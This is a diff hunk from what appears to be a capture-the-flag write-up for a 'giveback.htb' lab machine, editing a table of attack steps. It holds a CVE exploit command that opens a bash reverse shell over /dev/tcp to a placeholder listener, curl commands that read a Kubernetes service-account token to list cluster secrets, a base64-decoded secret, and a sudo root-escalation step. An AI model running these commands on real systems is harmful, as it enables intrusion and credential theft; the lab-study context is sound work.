@@ -1182,7 +1182,7 @@ SecurityEvent
 | **04** | Exploit RCE | `python CVE-2024-8353.py -u http://giveback.htb/give/the-things-we-need -c "bash -c 'bash -i >& /dev/tcp/<LHOST>/3333 0>&1'"` |
 | **05** | SSRF pivot | `php -r "echo file_get_contents('http://10.43.2.241:5000/');"` |
 | **06** | Deploy PHP‑CGI exploit | `cat > /tmp/exploit.php <<'EOF'\n<?php /* payload */ ?>\nEOF` |
-| **07** | Enumerate K8s API | `curl --cacert /run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/secrets` |
+| **07** | Enumerate K8s API | `curl --cacert /run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/secrets` ----> `curl --cacert /run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" "https://kubernetes.default.svc/api/v1/namespaces/$(cat /run/secrets/kubernetes.io/serviceaccount/namespace)/secrets`|
 | **08** | Decode secret | `echo 'dkNQV0FKRE5qY1NsTW9mc1RRcTg3dDZyVmszYnFWY3E=' | base64 -d` |
 | **09** | SSH into host | `ssh babywyrm@10.10.11.94` |
 | **10** | Escalate to root | `sudo /opt/debug run <malicious_config>` |
